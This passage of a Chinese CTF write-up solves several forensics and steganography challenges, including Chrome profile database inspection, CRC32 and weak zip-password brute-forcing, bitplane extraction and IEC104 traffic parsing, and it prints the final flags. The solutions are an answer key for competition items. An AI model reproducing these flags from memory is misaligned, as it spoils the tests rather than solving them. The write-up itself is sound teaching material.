</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>idx_list</span> <span class=o>=</span> <span class=p>[]</span>
</span></span><span class=line><span class=cl><span class=n>now_num</span> <span class=o>=</span> <span class=s1>&#39;0&#39;</span>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=nb>len</span><span class=p>(</span><span class=n>res</span><span class=p>)):</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>res</span><span class=p>[</span><span class=n>i</span><span class=p>]</span> <span class=o>!=</span> <span class=n>now_num</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=c1># print(i)</span>
</span></span><span class=line><span class=cl>        <span class=n>idx_list</span><span class=o>.</span><span class=n>append</span><span class=p>(</span><span class=n>i</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>now_num</span> <span class=o>=</span> <span class=n>res</span><span class=p>[</span><span class=n>i</span><span class=p>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>flag</span> <span class=o>=</span> <span class=nb>chr</span><span class=p>(</span><span class=mi>101</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span><span class=nb>len</span><span class=p>(</span><span class=n>idx_list</span><span class=p>)):</span>
</span></span><span class=line><span class=cl>    <span class=n>flag</span> <span class=o>+=</span> <span class=nb>chr</span><span class=p>(</span><span class=n>idx_list</span><span class=p>[</span><span class=n>i</span><span class=p>]</span><span class=o>-</span><span class=n>idx_list</span><span class=p>[</span><span class=n>i</span><span class=o>-</span><span class=mi>1</span><span class=p>])</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=n>flag</span><span class=p>)</span> <span class=c1># e25bd92141be945cfcdd1c65bb1b9375</span></span></span></code></pre></td></tr></table></div></div><h2 class=heading-element id=题目名称-未知><span>题目名称 未知</span>
<a href=#%e9%a2%98%e7%9b%ae%e5%90%8d%e7%a7%b0-%e6%9c%aa%e7%9f%a5 class=heading-mark><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5.0 114.95 4.95l-2.5 2.5a3.5 3.5.0 01-4.95.0.751.751.0 01.018-1.042.751.751.0 011.042-.018 1.998 1.998.0 002.83.0l2.5-2.5a2.002 2.002.0 00-2.83-2.83l-1.25 1.25a.751.751.0 01-1.042-.018.751.751.0 01-.018-1.042zm-4.69 9.64a1.998 1.998.0 002.83.0l1.25-1.25a.751.751.0 011.042.018.751.751.0 01.018 1.042l-1.25 1.25a3.5 3.5.0 11-4.95-4.95l2.5-2.5a3.5 3.5.0 014.95.0.751.751.0 01-.018 1.042.751.751.0 01-1.042.018 1.998 1.998.0 00-2.83.0l-2.5 2.5a1.998 1.998.0 000 2.83z"/></svg></a></h2><p>题目附件给了一张 <code>pk.gif</code> 和一张 <code>浏览器？.png</code>，尝试给 GIF 分帧，发现其中一帧有可疑的字符串：<code>hello_Hier_qw5612</code></p><p><img loading=lazy src=/posts/bb1da35/imgs/image-20250916200923042.png alt=/posts/bb1da35/imgs/image-20250916200923042.png height=822 width=1313></p><p>然后在另一张PNG末尾可以提取出一个加密的rar压缩包，解压密码就是上面得到的那串字符串</p><p>解压后可以得到一个完整的Chrome浏览器用户数据目录</p><p>主要关注这两个sqlite文件：<code>Google\Chrome\User Data\Default\History.db\Login Data</code>、<code>Google\Chrome\User Data\Default\History.db\History</code></p><p>vscode中如果装了<code>SQlite Viewer</code>插件，可以直接把这俩文件后缀改成<code>.db</code>查看</p><p><img loading=lazy src=/posts/bb1da35/imgs/image-20250916201359259.png alt=/posts/bb1da35/imgs/image-20250916201359259.png height=731 width=2592></p><p><img loading=lazy src=/posts/bb1da35/imgs/image-20250916201419076.png alt=/posts/bb1da35/imgs/image-20250916201419076.png height=476 width=2883></p><p>发现用户访问了希尔加密的网站，并且logins表中的两个用户名有点可疑</p><blockquote><p>.vyouhlvgbaryvxgjqknzbi,vgrqqrwbdxhximtq</p><p>bposqrclvjmzanfx</p></blockquote><p>上图中的那个希尔加密的网站好像已经寄了，于是我直接用新版随波逐流里的希尔加密了</p><p><img loading=lazy src=/posts/bb1da35/imgs/image-20250916201617439.png alt=/posts/bb1da35/imgs/image-20250916201617439.png height=958 width=1991></p><p><img loading=lazy src=/posts/bb1da35/imgs/image-20250916201628176.png alt=/posts/bb1da35/imgs/image-20250916201628176.png height=950 width=1975></p><p>一开始尝试解密发现出不来，最后发现要用加密才能得到最后的flag: <code>DASCTF{principle_of_basic_matrix_theory}</code></p><h2 class=heading-element id=题目名称-特殊流量><span>题目名称 特殊流量</span>
<a href=#%e9%a2%98%e7%9b%ae%e5%90%8d%e7%a7%b0-%e7%89%b9%e6%ae%8a%e6%b5%81%e9%87%8f class=heading-mark><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5.0 114.95 4.95l-2.5 2.5a3.5 3.5.0 01-4.95.0.751.751.0 01.018-1.042.751.751.0 011.042-.018 1.998 1.998.0 002.83.0l2.5-2.5a2.002 2.002.0 00-2.83-2.83l-1.25 1.25a.751.751.0 01-1.042-.018.751.751.0 01-.018-1.042zm-4.69 9.64a1.998 1.998.0 002.83.0l1.25-1.25a.751.751.0 011.042.018.751.751.0 01.018 1.042l-1.25 1.25a3.5 3.5.0 11-4.95-4.95l2.5-2.5a3.5 3.5.0 014.95.0.751.751.0 01-.018 1.042.751.751.0 01-1.042.018 1.998 1.998.0 00-2.83.0l-2.5 2.5a1.998 1.998.0 000 2.83z"/></svg></a></h2><p>题目附件给了一个流量包，翻看一下发现以下几个可疑信息</p><p>首先是给了一个hint：crc32</p><p><img loading=lazy src=/posts/bb1da35/imgs/image-20250917205924080.png alt=/posts/bb1da35/imgs/image-20250917205924080.png height=744 width=1675></p><p>然后上传了一个flag文件，熟悉文件头的话很容易发现这是一个十六进制逆序后的7z文件</p><p><img loading=lazy src=/posts/bb1da35/imgs/image-20250917205935758.png alt=/posts/bb1da35/imgs/image-20250917205935758.png height=1238 width=1675></p><p>直接CyberChef中逆序一下提取出来即可</p><p><img loading=lazy src=/posts/bb1da35/imgs/image-20250917210145240.png alt=/posts/bb1da35/imgs/image-20250917210145240.png height=1101 width=2553></p><p>然后继续看，发现用户还传了三个文件，分别是：pwd1.dat pwd2.dat pwd3.dat</p><p><img loading=lazy src=/posts/bb1da35/imgs/image-20250917210243642.png alt=/posts/bb1da35/imgs/image-20250917210243642.png height=1238 width=1675></p><p><img loading=lazy src=/posts/bb1da35/imgs/image-20250917210255450.png alt=/posts/bb1da35/imgs/image-20250917210255450.png height=1238 width=1675></p><p><img loading=lazy src=/posts/bb1da35/imgs/image-20250917210305243.png alt=/posts/bb1da35/imgs/image-20250917210305243.png height=1238 width=1675></p><p>出题人这里出的不好，因为传的每个dat文件也都是4字节的，很容易让选手认为这几个就是crc32的值</p><p>但是其实我们要爆破的是这三个数据crc32计算后的值</p><p>我们可以复制出原始的十六进制，然后用CyberChef转一下</p><p><img loading=lazy src=/posts/bb1da35/imgs/image-20250917210453035.png alt=/posts/bb1da35/imgs/image-20250917210453035.png height=843 width=1475></p><p><img loading=lazy src=/posts/bb1da35/imgs/image-20250917210506257.png alt=/posts/bb1da35/imgs/image-20250917210506257.png height=849 width=1502></p><p><img loading=lazy src=/posts/bb1da35/imgs/image-20250917210525392.png alt=/posts/bb1da35/imgs/image-20250917210525392.png height=850 width=1477></p><p>然后拿crc32爆破的脚本爆破一下crc32即可得到解压密码：<code>PAS4_Wo3d_he3e!</code></p><p><img loading=lazy src=/posts/bb1da35/imgs/image-20250917211011825.png alt=/posts/bb1da35/imgs/image-20250917211011825.png height=2088 width=3840></p><p>用上面的密码解压7z后可以得到一个 flag.txt 内容如下：</p><blockquote><p>D 1l A 1h S 1g 23 1d 2k 32 26 1n 3r 1k 1i 1k 1l 1d 33 1l 31 1p 34 1k 1p 1i 31 35 1m 32 1d 1m 1m 35 32 1m 1k 33 31 1n 1d 1m 1k 3t</p></blockquote><p>发现有DAS这三个关键的字母，然后别的数据应该都是32进制，因此我们写个脚本转换一下</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=k>def</span> <span class=nf>func</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=k>with</span> <span class=nb>open</span><span class=p>(</span><span class=s2>&#34;flag.txt&#34;</span><span class=p>,</span><span class=s1>&#39;r&#39;</span><span class=p>)</span> <span class=k>as</span> <span class=n>f</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>data</span> <span class=o>=</span> <span class=n>f</span><span class=o>.</span><span class=n>read</span><span class=p>()</span><span class=o>.</span><span class=n>split</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>flag</span> <span class=o>=</span> <span class=s2>&#34;&#34;</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>item</span> <span class=ow>in</span> <span class=n>data</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>item</span><span class=o>.</span><span class=n>isupper</span><span class=p>():</span>
</span></span><span class=line><span class=cl>            <span class=n>flag</span> <span class=o>+=</span> <span class=n>item</span>
</span></span><span class=line><span class=cl>        <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>flag</span> <span class=o>+=</span> <span class=nb>chr</span><span class=p>(</span><span class=nb>int</span><span class=p>(</span><span class=n>item</span><span class=p>,</span><span class=mi>32</span><span class=p>))</span>
</span></span><span class=line><span class=cl>            
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=n>flag</span><span class=p>)</span> 
</span></span><span class=line><span class=cl>    <span class=c1># D5A1S0C-TbF7{4245-c5a9d492ae6b-66eb64ca7-64}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=vm>__name__</span> <span class=o>==</span> <span class=s2>&#34;__main__&#34;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>func</span><span class=p>()</span></span></span></code></pre></td></tr></table></div></div><p>最后解个栅栏密码即可得到最后的flag：<code>DASCTF{25cad9a6-6b4a-4510-b744-5942eb6e6c76}</code></p><p><img loading=lazy src=/posts/bb1da35/imgs/image-20250917211345026.png alt=/posts/bb1da35/imgs/image-20250917211345026.png height=831 width=1217></p><h2 class=heading-element id=题目名称-theyearwewere162025黑龙江省赛><span>题目名称 the+year+we+were+16（2025黑龙江省赛）</span>
<a href=#%e9%a2%98%e7%9b%ae%e5%90%8d%e7%a7%b0-theyearwewere162025%e9%bb%91%e9%be%99%e6%b1%9f%e7%9c%81%e8%b5%9b class=heading-mark><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5.0 114.95 4.95l-2.5 2.5a3.5 3.5.0 01-4.95.0.751.751.0 01.018-1.042.751.751.0 011.042-.018 1.998 1.998.0 002.83.0l2.5-2.5a2.002 2.002.0 00-2.83-2.83l-1.25 1.25a.751.751.0 01-1.042-.018.751.751.0 01-.018-1.042zm-4.69 9.64a1.998 1.998.0 002.83.0l1.25-1.25a.751.751.0 011.042.018.751.751.0 01.018 1.042l-1.25 1.25a3.5 3.5.0 11-4.95-4.95l2.5-2.5a3.5 3.5.0 014.95.0.751.751.0 01-.018 1.042.751.751.0 01-1.042.018 1.998 1.998.0 00-2.83.0l-2.5 2.5a1.998 1.998.0 000 2.83z"/></svg></a></h2><p>题目附件给了一张文本头部数据被篡改后的 BMP 图片，010 打开提示报错</p><p><img loading=lazy src=/posts/bb1da35/imgs/image-20250922225747582.png alt=/posts/bb1da35/imgs/image-20250922225747582.png height=1836 width=2804></p><p>当我们把模板中的这两个参数修正后，虽然 010 还提示报错，但是BMP 图片已经能正常显示了</p><p><img loading=lazy src=/posts/bb1da35/imgs/image-20250922225844125.png alt=/posts/bb1da35/imgs/image-20250922225844125.png height=1012 width=1604></p><p>然后我们拿 stegsolve 打开，一个 Plane 一个 Plane 地查看，发现以下几个平面存在隐写的信息</p><p><img loading=lazy src=/posts/bb1da35/imgs/image-20250922230025465.png alt=/posts/bb1da35/imgs/image-20250922230025465.png height=1018 width=1342></p><p><img loading=lazy src=/posts/bb1da35/imgs/image-20250922230125118.png alt=/posts/bb1da35/imgs/image-20250922230125118.png height=1014 width=1340></p><p><img loading=lazy src=/posts/bb1da35/imgs/image-20250922230140137.png alt=/posts/bb1da35/imgs/image-20250922230140137.png height=1014 width=1342></p><p>因此我们把这几个平面上对应的信息提取出来，即可得到最后的 flag：<code>DASCTF{RGB_five_six_five_takes_you_back_to_old_live}</code></p><p><img loading=lazy src=/posts/bb1da35/imgs/image-20250922230235662.png alt=/posts/bb1da35/imgs/image-20250922230235662.png height=768 width=944></p><h2 class=heading-element id=题目名称-iec104><span>题目名称 IEC104</span>
<a href=#%e9%a2%98%e7%9b%ae%e5%90%8d%e7%a7%b0-iec104 class=heading-mark><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5.0 114.95 4.95l-2.5 2.5a3.5 3.5.0 01-4.95.0.751.751.0 01.018-1.042.751.751.0 011.042-.018 1.998 1.998.0 002.83.0l2.5-2.5a2.002 2.002.0 00-2.83-2.83l-1.25 1.25a.751.751.0 01-1.042-.018.751.751.0 01-.018-1.042zm-4.69 9.64a1.998 1.998.0 002.83.0l1.25-1.25a.751.751.0 011.042.018.751.751.0 01.018 1.042l-1.25 1.25a3.5 3.5.0 11-4.95-4.95l2.5-2.5a3.5 3.5.0 014.95.0.751.751.0 01-.018 1.042.751.751.0 01-1.042.018 1.998 1.998.0 00-2.83.0l-2.5 2.5a1.998 1.998.0 000 2.83z"/></svg></a></h2><blockquote><p>IEC104协议分析与利用，针对IEC104协议应用层U 帧、I帧、S帧进行分析，对I帧数据中的遥控数据进行篡改，获取遥控数据下写时的flag值。</p></blockquote><p>附件给了一个流量包，根据题面提示直接用 tshark 提取并分析I帧数据</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>tshark -r IEC-104.pcap -T fields -Y <span class=s1>&#39;_ws.col.protocol == &#34;IEC 60870-5 ASDU&#34;&#39;</span> -e <span class=s1>&#39;iec60870_asdu.siq&#39;</span> &gt; out.txt</span></span></code></pre></td></tr></table></div></div><p>然后 用 CyberChef 把 0x00 转为 0，0x01 转为 1</p><p><img loading=lazy src=/posts/bb1da35/imgs/image-20250925231620736.png alt=/posts/bb1da35/imgs/image-20250925231620736.png height=1750 width=2796></p><p>逆序一下，然后二进制转字符串，再逆序回来即可得到最后的 flag</p><p><code>flag{f8617e2a5e7df41823615de093b095de5175e2fce58e14af74bec73c81f0d77a}</code></p><p><img loading=lazy src=/posts/bb1da35/imgs/image-20250925231658146.png alt=/posts/bb1da35/imgs/image-20250925231658146.png height=1186 width=2798></p><p>当然也可以直接用 PuzzleSolver 一把梭</p><p><img loading=lazy src=/posts/bb1da35/imgs/image-20250925231809222.png alt=/posts/bb1da35/imgs/image-20250925231809222.png height=1212 width=1494></p><h2 class=heading-element id=题目名称-comstego_14><span>题目名称 comstego_14</span>
<a href=#%e9%a2%98%e7%9b%ae%e5%90%8d%e7%a7%b0-comstego_14 class=heading-mark><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5.0 114.95 4.95l-2.5 2.5a3.5 3.5.0 01-4.95.0.751.751.0 01.018-1.042.751.751.0 011.042-.018 1.998 1.998.0 002.83.0l2.5-2.5a2.002 2.002.0 00-2.83-2.83l-1.25 1.25a.751.751.0 01-1.042-.018.751.751.0 01-.018-1.042zm-4.69 9.64a1.998 1.998.0 002.83.0l1.25-1.25a.751.751.0 011.042.018.751.751.0 01.018 1.042l-1.25 1.25a3.5 3.5.0 11-4.95-4.95l2.5-2.5a3.5 3.5.0 014.95.0.751.751.0 01-.018 1.042.751.751.0 01-1.042.018 1.998 1.998.0 00-2.83.0l-2.5 2.5a1.998 1.998.0 000 2.83z"/></svg></a></h2><p>题目附件给了一个压缩包，压缩包注释中给了如下提示：</p><p><img loading=lazy src=/posts/bb1da35/imgs/image-20251009034452668.png alt=/posts/bb1da35/imgs/image-20251009034452668.png height=1050 width=1948></p><p>解压压缩包可以得到一张 JPG，010 打开可以发现 JPG 末尾藏了另一张 JPG</p><p><img loading=lazy src=/posts/bb1da35/imgs/image-20251009034600624.png alt=/posts/bb1da35/imgs/image-20251009034600624.png height=1836 width=2798></p><p>尝试手动提取出来，发现提取出来的这张 JPG 末尾还有一张 JPG，因此我们再次提取</p><p>可以得到三张 JPG，并且图片显示的内容都差不多</p><p><img loading=lazy src=/posts/bb1da35/imgs/image-20251009034806252.png alt=/posts/bb1da35/imgs/image-20251009034806252.png height=1692 width=1416></p><p>再次用 010 打开这三张 JPG 图片，发现这三张图片的数据长度是一样的</p><p><img loading=lazy src=/posts/bb1da35/imgs/image-20251009034920988.png alt=/posts/bb1da35/imgs/image-20251009034920988.png height=1836 width=2804></p><p>因此这个时候，我们就可以尝试用 010 的比较功能去 diff 一下，从而快速定位关键点</p><p><img loading=lazy src=/posts/bb1da35/imgs/image-20251009035053299.png alt=/posts/bb1da35/imgs/image-20251009035053299.png height=1836 width=2804></p><p><img loading=lazy src=/posts/bb1da35/imgs/image-20251009035114382.png alt=/posts/bb1da35/imgs/image-20251009035114382.png height=1836 width=2804></p><p><img loading=lazy src=/posts/bb1da35/imgs/image-20251009035212721.png alt=/posts/bb1da35/imgs/image-20251009035212721.png height=1836 width=2804></p><p>然后结合之前得到的提示，flag 的 ASCII 码是整体减 1 了的</p><p>经过组合和尝试，发现其实三张图片整个隐写思路其实是这样：</p><blockquote><p>把 flag 的 ASCII 整体减 1，然后拆分成三段，第一段在原图的 0x1FA1，第二段在 1.jpg 的 0x574A，第三段在 2.jpg 的 0x77A0</p></blockquote><p>我们将以上三段数据提取出来，ASCII 码整体加 1 即可得到最后的 flag：<code>flag{5e6e6ee1812bf00857ce8011c862ef16de}</code></p><p><img loading=lazy src=/posts/bb1da35/imgs/image-20251009035345183.png alt=/posts/bb1da35/imgs/image-20251009035345183.png height=1140 width=2252></p><h2 class=heading-element id=题目名称-easyimg2022天权信安杯><span>题目名称 Easyimg（2022天权信安杯）</span>
<a href=#%e9%a2%98%e7%9b%ae%e5%90%8d%e7%a7%b0-easyimg2022%e5%a4%a9%e6%9d%83%e4%bf%a1%e5%ae%89%e6%9d%af class=heading-mark><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5.0 114.95 4.95l-2.5 2.5a3.5 3.5.0 01-4.95.0.751.751.0 01.018-1.042.751.751.0 011.042-.018 1.998 1.998.0 002.83.0l2.5-2.5a2.002 2.002.0 00-2.83-2.83l-1.25 1.25a.751.751.0 01-1.042-.018.751.751.0 01-.018-1.042zm-4.69 9.64a1.998 1.998.0 002.83.0l1.25-1.25a.751.751.0 011.042.018.751.751.0 01.018 1.042l-1.25 1.25a3.5 3.5.0 11-4.95-4.95l2.5-2.5a3.5 3.5.0 014.95.0.751.751.0 01-.018 1.042.751.751.0 01-1.042.018 1.998 1.998.0 00-2.83.0l-2.5 2.5a1.998 1.998.0 000 2.83z"/></svg></a></h2><p>题目附件给了一个加密的压缩包，尝试弱密码爆破，可以得到八位纯数字弱密码：<code>99999999</code></p><p>解压后得到一个 img.JPG，但是 010 打开发现其实是一张 PNG 图片</p><p><img loading=lazy src=/posts/bb1da35/imgs/image-20251009100032469.png alt=/posts/bb1da35/imgs/image-20251009100032469.png height=1836 width=2798></p><p>因此我们改后缀为 .png，再用 010 打开，发现 PNG 文件尾部数据被篡改（逆序）了</p><p><img loading=lazy src=/posts/bb1da35/imgs/image-20251009100117455.png alt=/posts/bb1da35/imgs/image-20251009100117455.png height=1836 width=2798></p><p>并且发现末尾的数据中存在 JPG 图像</p><p><img loading=lazy src=/posts/bb1da35/imgs/image-20251009130024555.png alt=/posts/bb1da35/imgs/image-20251009130024555.png height=1836 width=2798></p><p>尝试手动提取出来可以得到下图：</p><p><img loading=lazy src=/posts/bb1da35/imgs/image-20251009131646610.png alt=/posts/bb1da35/imgs/image-20251009131646610.png height=1260 width=1710></p><p>结合之前的 PNG 数据，一共 180 个 IDAT 块，18 个 IDAT 块作为一组，把每组数据的位置按照上图重置了</p><p>因此我们尝试根据上图的提示按顺序提取一下 IDAT 块，重新排列一下即可得到下图</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>data</span> <span class=o>=</span> <span class=p>[</span><span class=mi>1</span><span class=p>,</span><span class=mi>7</span><span class=p>,</span><span class=mi>9</span><span class=p>,</span><span class=mi>8</span><span class=p>,</span><span class=mi>5</span><span class=p>,</span><span class=mi>3</span><span class=p>,</span><span class=mi>2</span><span class=p>,</span><span class=mi>4</span><span class=p>,</span><span class=mi>6</span><span class=p>,</span><span class=mi>10</span><span class=p>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>idx</span><span class=p>,</span><span class=n>item</span> <span class=ow>in</span> <span class=nb>enumerate</span><span class=p>(</span><span class=n>data</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;组</span><span class=si>{</span><span class=n>item</span><span class=si>}</span><span class=s2>: </span><span class=si>{</span><span class=p>(</span><span class=n>idx</span><span class=p>)</span><span class=o>*</span><span class=mi>18</span><span class=o>+</span><span class=mi>1</span><span class=si>}</span><span class=s2>,</span><span class=si>{</span><span class=p>(</span><span class=n>idx</span><span class=o>+</span><span class=mi>1</span><span class=p>)</span><span class=o>*</span><span class=mi>18</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl><span class=c1># 组1: 1,18</span>
</span></span><span class=line><span class=cl><span class=c1># 组7: 19,36</span>
</span></span><span class=line><span class=cl><span class=c1># 组9: 37,54</span>
</span></span><span class=line><span class=cl><span class=c1># 组8: 55,72</span>
</span></span><span class=line><span class=cl><span class=c1># 组5: 73,90</span>
</span></span><span class=line><span class=cl><span class=c1># 组3: 91,108</span>
</span></span><span class=line><span class=cl><span class=c1># 组2: 109,126</span>
</span></span><span class=line><span class=cl><span class=c1># 组4: 127,144</span>
</span></span><span class=line><span class=cl><span class=c1># 组6: 145,162</span>
</span></span><span class=line><span class=cl><span class=c1># 组10: 163,180</span></span></span></code></pre></td></tr></table></div></div><p><img loading=lazy src=/posts/bb1da35/imgs/image-20251009134242193.png alt=/posts/bb1da35/imgs/image-20251009134242193.png height=1030 width=1666></p><p>用 stegsolve 打开修复得到的 PNG 图片，浏览一下不同通道的各个平面，在下面这个平面可以看到下图</p><p><img loading=lazy src=/posts/bb1da35/imgs/image-20251009134900263.png alt=/posts/bb1da35/imgs/image-20251009134900263.png height=1456 width=2000></p><p>看到这个，我感觉可能是左右两边按列提取数据然后异或，并且 29424 bits = 3678 bytes</p><p>对于这种类型的隐写，我们从 stegsolve 中看出来是按行读取还是按列读取后</p><p>可以用 PS 打开来确定两部分读取的顺序，就是通过看在哪里中断的来判断是从左向右还是从右向左</p><p><img loading=lazy src=/posts/bb1da35/imgs/image-20251009145226668.png alt=/posts/bb1da35/imgs/image-20251009145226668.png height=1836 width=2810></p><p><img loading=lazy src=/posts/bb1da35/imgs/image-20251009145553006.png alt=/posts/bb1da35/imgs/image-20251009145553006.png height=1836 width=2810></p><p>确定好顺序后，我们直接写个脚本提取下并异或即可</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>PIL</span> <span class=kn>import</span> <span class=n>Image</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>libnum</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>func</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=n>img</span> <span class=o>=</span> <span class=n>Image</span><span class=o>.</span><span class=n>open</span><span class=p>(</span><span class=s1>&#39;flag.png&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>w</span><span class=p>,</span><span class=n>h</span> <span class=o>=</span> <span class=n>img</span><span class=o>.</span><span class=n>size</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>    <span class=n>a_list</span> <span class=o>=</span> <span class=p>[]</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>x</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=n>w</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=k>for</span> <span class=n>y</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=n>h</span><span class=p>):</span>
</span></span><span class=line><span class=cl>            <span class=n>r</span><span class=p>,</span><span class=n>g</span><span class=p>,</span><span class=n>b</span><span class=p>,</span><span class=n>a</span> <span class=o>=</span> <span class=n>img</span><span class=o>.</span><span class=n>getpixel</span><span class=p>((</span><span class=n>x</span><span class=p>,</span><span class=n>y</span><span class=p>))</span>
</span></span><span class=line><span class=cl>            <span class=n>a_list</span><span class=o>.</span><span class=n>append</span><span class=p>(</span><span class=nb>str</span><span class=p>(</span><span class=n>a</span> <span class=o>&gt;&gt;</span> <span class=mi>1</span> <span class=o>&amp;</span> <span class=mi>1</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=n>data1</span> <span class=o>=</span> <span class=n>libnum</span><span class=o>.</span><span class=n>b2s</span><span class=p>(</span><span class=s1>&#39;&#39;</span><span class=o>.</span><span class=n>join</span><span class=p>(</span><span class=n>a_list</span><span class=p>[:</span><span class=mi>29424</span><span class=p>]))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>a_list</span> <span class=o>=</span> <span class=p>[]</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>x</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=n>w</span><span class=o>-</span><span class=mi>1</span><span class=p>,</span><span class=mi>0</span><span class=p>,</span><span class=o>-</span><span class=mi>1</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=k>for</span> <span class=n>y</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=n>h</span><span class=p>):</span>
</span></span><span class=line><span class=cl>            <span class=n>r</span><span class=p>,</span><span class=n>g</span><span class=p>,</span><span class=n>b</span><span class=p>,</span><span class=n>a</span> <span class=o>=</span> <span class=n>img</span><span class=o>.</span><span class=n>getpixel</span><span class=p>((</span><span class=n>x</span><span class=p>,</span><span class=n>y</span><span class=p>))</span>
